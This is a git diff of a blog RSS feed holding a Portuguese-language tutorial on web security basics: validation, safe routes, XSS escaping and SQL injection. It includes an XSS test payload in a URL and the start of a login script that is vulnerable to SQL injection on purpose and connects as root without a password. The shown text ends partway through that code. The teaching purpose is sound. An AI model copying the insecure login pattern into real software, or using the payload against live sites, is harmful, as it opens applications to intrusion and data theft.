@@ -1,9 +1,416 @@
-<?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0"><channel><title>Klaus Laube - sql-injection</title><link>https://klauslaube.com.br/</link><description>Python, Django e desenvolvimento Web</description><lastBuildDate>Sun, 15 Apr 2012 18:03:48 -0300</lastBuildDate><item><title>Problemas comuns de segurança em aplicações Web</title><link>https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html</link><description>&lt;p&gt;Seria perfeito se o mundo fosse feito apenas de pessoas
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Klaus Laube - sql-injection]]></title><description><![CDATA[Python, Django e desenvolvimento Web]]></description><link>https://klauslaube.com.br</link><generator>RSS for Node</generator><lastBuildDate>Wed, 20 May 2020 08:30:30 GMT</lastBuildDate><author><![CDATA[Klaus Peter Laube]]></author><item><title><![CDATA[Problemas comuns de segurança em aplicações Web]]></title><description><![CDATA[Seria perfeito se o mundo fosse feito apenas de pessoas
+bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
+a raça humana, do que o homem deixar de tirar proveito de alguma
+situação. Quando estamos desenvolvendo nossas aplicações web, temos que
+“pensar” como um usuário mal…]]></description><link>https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html</link><guid isPermaLink="false">https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sun, 15 Apr 2012 18:03:48 GMT</pubDate><content:encoded>&lt;p&gt;Seria perfeito se o mundo fosse feito apenas de pessoas
 bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
 a raça humana, do que o homem deixar de tirar proveito de alguma
 situação.&lt;/p&gt;
-&lt;!-- PELICAN_END_SUMMARY --&gt;
+&lt;p&gt;Quando estamos desenvolvendo nossas aplicações &lt;a href=&quot;/tag/web.html&quot; title=&quot;Leia mais sobre Web&quot;&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, temos que
+“pensar” como um usuário mal-intencionado. Não somente para garantir o
+bom funcionamento da mesma, mas também para garantir a segurança e
+bem-estar dos “usuários civis” que consomem os nossos serviços.&lt;/p&gt;
+&lt;p&gt;Vamos explorar alguns problemas relacionados a segurança, e mostrar como
+solucioná-los de forma simples e prática.&lt;/p&gt;
+&lt;h2&gt;Use frameworks!&lt;/h2&gt;
+&lt;p&gt;E esta é a minha primeira dica para você: use &lt;em&gt;frameworks&lt;/em&gt; sempre que
+possível!&lt;/p&gt;
+&lt;p&gt;Eles já possuem um conjunto de ferramentas que contornam problemas como
+&lt;em&gt;SQL Injection&lt;/em&gt;, &lt;em&gt;XSS&lt;/em&gt; e &lt;em&gt;CSRF&lt;/em&gt;. Pessoas muito inteligentes já pensaram no
+problema e já solucionaram para você. Na maioria dos casos, mais de uma vez!&lt;/p&gt;
+&lt;p&gt;Em alguns &lt;em&gt;frameworks&lt;/em&gt;, como o &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; e &lt;a href=&quot;/tag/codeigniter.html&quot; title=&quot;Leia mais sobre Codeigniter&quot;&gt;&lt;em&gt;Codeigniter&lt;/em&gt;&lt;/a&gt;, essas
+ferramentas são quase “transparentes”, ou seja, você tem pouco (ou
+nenhum) trabalho para utilizá-las no cotidiano.&lt;/p&gt;
+&lt;p&gt;Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje
+posso apontar vários pontos de falhas em aplicações que produzi no
+passado. Os &lt;em&gt;frameworks&lt;/em&gt; diminuem muito estes pontos, por isso vale a
+pena o seu uso.&lt;/p&gt;
+&lt;h2&gt;Validações (nunca confie no usuário)&lt;/h2&gt;
+&lt;p&gt;Como eu comecei com o &lt;a href=&quot;/tag/php.html&quot; title=&quot;Leia mais sobre PHP&quot;&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;, sei muito bem que este é um problema
+comum em aplicações desenvolvidas por iniciantes.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Nunca confie no usuário&lt;/strong&gt;, e principalmente &lt;strong&gt;nunca confie em
+validações realizadas pelo &lt;a href=&quot;/tag/javascript.html&quot; title=&quot;Leia mais sobre Javascript&quot;&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;&lt;/strong&gt;. Todo ponto de entrada de
+informação deve possuir uma validação no &lt;em&gt;server-side&lt;/em&gt;, mesmo que exista
+uma validação no &lt;em&gt;client-side&lt;/em&gt;. &lt;strong&gt;Lembre-se:&lt;/strong&gt; Existem navegadores que
+não utilizam &lt;em&gt;Javascript&lt;/em&gt;, e mesmo os que utilizam, permitem que o
+usuário desabilite esta função.&lt;/p&gt;
+&lt;p&gt;No &lt;em&gt;Django&lt;/em&gt;, podemos fazer validações de formulários através de
+&lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/forms/&quot; title=&quot;Conheça os Forms no Django&quot;&gt;&lt;em&gt;Forms&lt;/em&gt;&lt;/a&gt;. No &lt;em&gt;Codeigniter&lt;/em&gt; fazemos através da &lt;a href=&quot;http://codeigniter.com/user_guide/libraries/form_validation.html&quot; title=&quot;Veja como fazer validações de formulário no Codeigniter&quot;&gt;&lt;em&gt;Form Validation Class&lt;/em&gt;&lt;/a&gt;.
+Em &lt;em&gt;PHP&lt;/em&gt; “puro”, podemos fazer validações através da &lt;a href=&quot;http://pear.php.net/manual/en/package.validate.validate.intro.php&quot; title=&quot;Instale a Validate através da PEAR&quot;&gt;biblioteca &lt;em&gt;Validate&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;As ferramentas citadas acima são extremamente eficientes para ações
+realizadas via &lt;em&gt;POST&lt;/em&gt;. Mas e quando temos parâmetros vindos da &lt;em&gt;URL&lt;/em&gt;,
+através do método &lt;em&gt;GET&lt;/em&gt;, qual é a melhor maneira de agirmos?&lt;/p&gt;
+&lt;h3&gt;URLs seguras e amigáveis&lt;/h3&gt;
+&lt;p&gt;Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial
+nas aplicações &lt;em&gt;web&lt;/em&gt; e tornaram-se item obrigatório. Além de trazer o
+benefício do &lt;a href=&quot;http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca&quot; title=&quot;Leia mais sobre SEO no Wikipedia&quot;&gt;&lt;em&gt;SEO&lt;/em&gt;&lt;/a&gt;, elas podem ser uma grande aliada quando o
+assunto é segurança.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;URLs&lt;/em&gt; que antes eram feitas dessa maneira:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;/blog.php?year=2012&amp;amp;month=12&amp;amp;day=21&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Podem ser reproduzidas desta forma:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;/blog/2012/12/21/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;O mecanismo de rotas de alguns &lt;em&gt;frameworks&lt;/em&gt; permite a utilização de
+expressões regulares na construção do caminho. Por exemplo, em &lt;em&gt;Django&lt;/em&gt;
+temos o seguinte cenário:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# urls.py&lt;/span&gt;
 
-&lt;p&gt;Quando estamos desenvolvendo nossas aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, temos que
-“pensar” como um usuário mal-intencionado. Não somente para garantir …&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Klaus Peter Laube</dc:creator><pubDate>Sun, 15 Apr 2012 18:03:48 -0300</pubDate><guid isPermaLink="false">tag:klauslaube.com.br,2012-04-15:/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html</guid><category>desenvolvimento</category><category>web</category><category>segurança</category><category>xss</category><category>csrf</category><category>sql-injection</category><category>php-injection</category><category>django</category><category>php</category><category>codeigniter</category></item></channel></rss>
+urlpatterns &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; patterns&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&apos;^blog/(?P&amp;lt;year&gt;\d{4})/(?P&amp;lt;month&gt;[0-9]{2})/(?P&amp;lt;day&gt;\d{2})/$&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;blog.views.index&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Determinamos que a rota inicia-se por &lt;code class=&quot;language-text&quot;&gt;blog&lt;/code&gt;, sendo composta por um
+valor numérico de 4 dígitos que atende pelo identificador &lt;code class=&quot;language-text&quot;&gt;year&lt;/code&gt;,
+outro valor de dois dígitos, indo de 0 a 9, chamado &lt;code class=&quot;language-text&quot;&gt;month&lt;/code&gt;, e o
+último um valor numérico de 2 dígitos chamado &lt;code class=&quot;language-text&quot;&gt;day&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A verificação é feita no momento da requisição. Se a rota informada
+bater com o padrão criado, ele executa a &lt;em&gt;view&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;blog.views&lt;/code&gt;. Caso
+contrário, se a rota não bater com nenhum padrão informado (por exemplo,
+&lt;code class=&quot;language-text&quot;&gt;/blog/2012/aa/21/&lt;/code&gt;), o usuário tomará um erro 404.&lt;/p&gt;
+&lt;p&gt;Em nossa &lt;em&gt;view&lt;/em&gt;, resgataríamos esses valores da seguinte forma:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# blog/views.py&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; year&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; month&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; day&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token comment&quot;&gt;# Lógica de renderização...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Simples assim! Temos um “input” de informação através de &lt;em&gt;GET&lt;/em&gt;, onde
+temos certeza do seu tipo e tamanho.&lt;/p&gt;
+&lt;p&gt;O mesmo resultado pode ser obtido com o &lt;em&gt;Codeigniter&lt;/em&gt;, basta adicionar a
+expressão desejada em seu &lt;code class=&quot;language-text&quot;&gt;application/config/routes.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token shell-comment comment&quot;&gt;# application/config/routes.php&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;blog/(\d{4})/([0-9]{2})/(\d{2})&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;blog/index/&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$1&lt;/span&gt;&lt;/span&gt;/&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$2&lt;/span&gt;&lt;/span&gt;/&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$3&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos
+criados na expressão regular.&lt;/p&gt;
+&lt;p&gt;Você não precisa utilizar um &lt;em&gt;framework&lt;/em&gt; para ter um esquema de rotas
+como ilustrado acima. Um resultado parecido pode ser atingido através do
+&lt;a href=&quot;/tag/nginx.html&quot; title=&quot;Leia mais sobre Nginx&quot;&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; e do &lt;em&gt;Apache&lt;/em&gt; com &lt;em&gt;mod-rewrite&lt;/em&gt;. &lt;a href=&quot;http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php&quot; title=&quot;Como criar rotas para arquivos PHP com o Apache&quot;&gt;Veja um exemplo de uso&lt;/a&gt;
+apresentado numa &lt;em&gt;thread&lt;/em&gt; do &lt;em&gt;Stack Overflow&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;É claro que verificações mais complexas, como por exemplo, se o nome do
+usuário informado na &lt;em&gt;URL&lt;/em&gt; é válido, necessitam de regras específicas,
+muito provavelmente escritas dentro da &lt;em&gt;view&lt;/em&gt;. Um ponto de falha que
+vale ressaltar é a criação de expressões regulares “genéricas”, que não
+discriminam o tipo e tamanho dos valores informados.&lt;/p&gt;
+&lt;h3&gt;Verificação de tipos de dados&lt;/h3&gt;
+&lt;p&gt;Mas e quando não temos como fugir de um valor passado via &lt;em&gt;GET&lt;/em&gt;? Pode
+acontecer! Por exemplo, em paginações (onde normalmente passamos um
+valor &lt;code class=&quot;language-text&quot;&gt;page&lt;/code&gt; como parâmetro), ou em uma busca (onde passamos o valor
+pesquisado via &lt;em&gt;GET&lt;/em&gt;).&lt;/p&gt;
+&lt;p&gt;Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas
+de interpretação do nosso código:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$page&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;/^\d+$/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;A solução acima não é infalível, mas é uma maneira de diminuírmos a
+incidência de erros. Se um valor diferente de inteiro positivo for
+passado, a página a ser exibida será a primeira.&lt;/p&gt;
+&lt;h2&gt;XSS – Cross-Site Scripting (não confie na informação)&lt;/h2&gt;
+&lt;p&gt;É certo que, validando toda e qualquer
+informação que a sua aplicação receber, você diminuirá muito a
+ocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da
+informação, não podemos confiar no seu conteúdo.&lt;/p&gt;
+&lt;p&gt;Imagine que você possua um &lt;em&gt;blog&lt;/em&gt;. Só você pode escrever artigos nele,
+então você conhece o conteúdo da informação sendo produzida. Certo dia
+você resolve que os usuários poderão comentar no seu &lt;em&gt;blog&lt;/em&gt;, e
+desenvolve uma ferramenta de comentários com todas as validações citadas
+anteriormente.&lt;/p&gt;
+&lt;p&gt;Até que em certo momento, um usuário mal-intencionado &lt;strong&gt;escreve um
+comentário&lt;/strong&gt; no seu &lt;em&gt;post&lt;/em&gt;, e neste comentário existe um &lt;strong&gt;&lt;em&gt;script&lt;/em&gt;&lt;/strong&gt;
+&lt;em&gt;Javascript&lt;/em&gt; que explora uma &lt;strong&gt;falha de segurança&lt;/strong&gt; do &lt;em&gt;ActiveX&lt;/em&gt; (por
+exemplo). Logo, todos os leitores que utilizam &lt;em&gt;Internet Explorer&lt;/em&gt; e
+leram o seu &lt;em&gt;post&lt;/em&gt; são infectados por um &lt;em&gt;malware&lt;/em&gt; que o seu &lt;em&gt;blog&lt;/em&gt;
+ajudou a proliferar.&lt;/p&gt;
+&lt;p&gt;A injeção de um &lt;em&gt;script&lt;/em&gt; em um &lt;em&gt;website&lt;/em&gt;, através de campos de textos ou
+passagem de parâmetros, é caracterizado como um ataque de &lt;strong&gt;&lt;em&gt;Cross-Site
+Scripting&lt;/em&gt;&lt;/strong&gt; (ou &lt;em&gt;XSS&lt;/em&gt;).&lt;/p&gt;
+&lt;p&gt;Uma maneira muito comum de evitar esse tipo de problema é simplesmente
+“escapando” ou removendo elementos &lt;em&gt;HTML&lt;/em&gt; do conteúdo:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;token shell-comment comment&quot;&gt;# xss.php&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$var&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;var&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Acessar &lt;code class=&quot;language-text&quot;&gt;xss.php&lt;/code&gt; com um &lt;code class=&quot;language-text&quot;&gt;alert&lt;/code&gt; &lt;em&gt;Javascript&lt;/em&gt; como parâmetro, não
+executará o comando, e sim apenas exibirá o conteúdo na tela, com os
+caracteres que delimitam o elemento &lt;code class=&quot;language-text&quot;&gt;script&lt;/code&gt; devidamente formatados:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;http://localhost/xss.php?var=&amp;amp;lt;script&amp;amp;gt;alert(&amp;quot;XSS!&amp;quot;);&amp;amp;lt;/script&amp;amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Existem alguns &lt;a href=&quot;http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/&quot; title=&quot;Conheça 20 excelentes editores WYSIWYG&quot;&gt;&lt;em&gt;Rich Text Editors&lt;/em&gt;&lt;/a&gt; que verificam e formatam o
+conteúdo do campo antes de uma submissão. Mas &lt;strong&gt;lembre-se&lt;/strong&gt;! Editores
+&lt;em&gt;WYSIWYG&lt;/em&gt; são basicamente &lt;em&gt;Javascript&lt;/em&gt;, logo, se eu desabilitar o
+&lt;em&gt;Javascript&lt;/em&gt; do meu navegador, posso enviar &lt;em&gt;scripts&lt;/em&gt; maliciosos sem
+impeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de
+validação no &lt;em&gt;server-side&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;O &lt;em&gt;Codeigniter&lt;/em&gt;, com a opção &lt;code class=&quot;language-text&quot;&gt;$config[&amp;#39;global_xss_filtering’]&lt;/code&gt; como
+&lt;code class=&quot;language-text&quot;&gt;TRUE&lt;/code&gt;, filtra automaticamente os dados resgatados de &lt;em&gt;GET&lt;/em&gt; ou &lt;em&gt;POST&lt;/em&gt;.
+O que acho bacana desse filtro, é que ele previne apenas a injeção de
+&lt;em&gt;scripts&lt;/em&gt; e atributos que podem de alguma forma prejudicar na segurança
+da sua aplicação, não necessariamente formatando o conteúdo todo.&lt;/p&gt;
+&lt;p&gt;Este tratamento está ativo por padrão no &lt;em&gt;engine&lt;/em&gt; de &lt;em&gt;templates&lt;/em&gt; do
+&lt;em&gt;Django&lt;/em&gt;. Embora isso não impeça o armazenamento do &lt;em&gt;script&lt;/em&gt; no banco de
+dados, impede que a sua renderização afete os usuários da sua aplicação.&lt;/p&gt;
+&lt;p&gt;Uma outra forma muito bacana de prevenir este tipo de inconveniente é
+utilizando uma linguagem de marcação alternativa, como &lt;em&gt;Textile&lt;/em&gt; e
+&lt;em&gt;Markdown&lt;/em&gt;, em campos de textos abertos.&lt;/p&gt;
+&lt;h2&gt;SQL Injection (não confie em sua aplicação)&lt;/h2&gt;
+&lt;p&gt;Entre as vulnerabilidades citadas, acredito que o
+&lt;strong&gt;&lt;em&gt;SQL Injection&lt;/em&gt;&lt;/strong&gt; é uma das mais
+destrutivas, tanto para a sua aplicação, quanto para os seus usuários.&lt;/p&gt;
+&lt;p&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;É um tipo de ameaça de segurança que se aproveita de falhas em
+sistemas que interagem com bases de dados via SQL. A injeção de
+SQL ocorre quando o atacante consegue inserir
+uma série de instruções SQL dentro de uma
+consulta (query) através da manipulação das entrada de dados de uma
+aplicação.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Os resultados podem ser os mais desastrosos, como por exemplo, o acesso
+de usuários não autorizados a áreas restritas, e o roubo de informações
+da sua base de dados. Abaixo, uma autenticação simples, utilizando nome
+de usuário e senha:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;token shell-comment comment&quot;&gt;# sql-injection.php&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;    &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;      &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;// Abre conexão com o banco de dados&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$link&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_connect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token comment&quot;&gt;// Seleciona a base de dados&lt;/span&gt;
